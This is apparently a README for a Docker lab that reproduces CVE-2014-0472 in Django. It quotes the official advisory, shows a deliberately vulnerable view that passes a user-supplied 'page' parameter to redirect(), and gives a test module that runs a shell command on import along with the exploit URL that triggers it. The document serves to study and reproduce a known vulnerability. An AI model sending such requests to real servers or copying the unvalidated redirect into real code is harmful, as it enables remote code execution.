# CVE-2014-0472

Use 

```
docker-compose up -d
```

Access localhost:8083

Reference:
[https://www.djangoproject.com/weblog/2014/apr/21/security/](https://www.djangoproject.com/weblog/2014/apr/21/security/)
> 
> 1. One or more views are present which construct a URL based on user input (commonly, a "next" parameter in a querystring indicating where to redirect upon successful completion of an action).
> 2. One or more modules are known to an attacker to exist on the server's Python import path, which perform code execution with side effects on importing.


In `tests.py`
```python
def evil_function():
    print("exploit successful")
    os.system("echo > /tmp/`whoami` ")
    return os.getuid()


evil = evil_function()
```

In `views.py`
```python
def redirect_test(request):
        page = request.GET.get('page', None)
        if page is not None:
                redirect(page)
        return HttpResponse("OK")
```

Use redirect function to call to the evil function

![avater](img/tmp_list.png)

Use exp

```
http://your-ip:8083/example?page=app.tests.evil
```

![avater](img/exec_evil.png)

Exploited


![avater](img/exploit.png)

